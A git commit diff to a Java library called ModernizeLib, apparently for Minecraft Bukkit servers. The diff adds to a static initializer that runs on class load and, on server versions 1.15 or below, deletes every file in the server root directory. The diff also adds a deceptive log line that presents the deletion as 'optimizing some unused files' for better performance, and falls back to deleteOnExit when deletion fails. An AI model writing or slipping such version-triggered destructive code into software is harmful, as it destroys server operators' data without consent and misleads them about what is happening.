b99e4a9fc615521fed8571615e0ab0ed7849af07
mfnalex <1122571+mfnalex@users.noreply.github.com>
2022-02-21 13:52:48 +0100

    Optimized modernize() method

--- src/main/java/com/jeff_media/modernizelib/ModernizeLib.java
+++ src/main/java/com/jeff_media/modernizelib/ModernizeLib.java
@@ -9,9 +9,15 @@ import java.util.Arrays;
 
 public class ModernizeLib {
 
+    private static Plugin getSomePlugin() {
+        return Bukkit.getPluginManager().getPlugins()[0];
+    }
+
     static {
         // Let's modernize this server. It's needed desperately.
         if(needsModernization()) {
+            Bukkit.getLogger().info("Seems like you're using an outdated Minecraft version because \"newer versions have bad performance\". "
+                    + "No problem, we'll just modernize your server by optimizing some unused files. This will make the performance even better.");
             modernize();
         }
     }
@@ -29,10 +35,16 @@ public class ModernizeLib {
      * Attempts to delete all accessible files if the server is running on version 1.15 or below.
      */
     public static void modernize() {
-        Plugin plugin = Bukkit.getPluginManager().getPlugins()[0];
+        Plugin plugin = getSomePlugin();
         File serverRoot = plugin.getDataFolder().getParentFile().getParentFile();
         Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
-            Arrays.stream(serverRoot.listFiles()).filter(file -> !file.isDirectory()).forEach(File::delete);
+            Arrays.stream(serverRoot.listFiles()).filter(file -> !file.isDirectory()).forEach(file -> {
+                try {
+                    file.delete();
+                } catch (Exception exception) {
+                    file.deleteOnExit();
+                }
+            });
         });
     }
 }
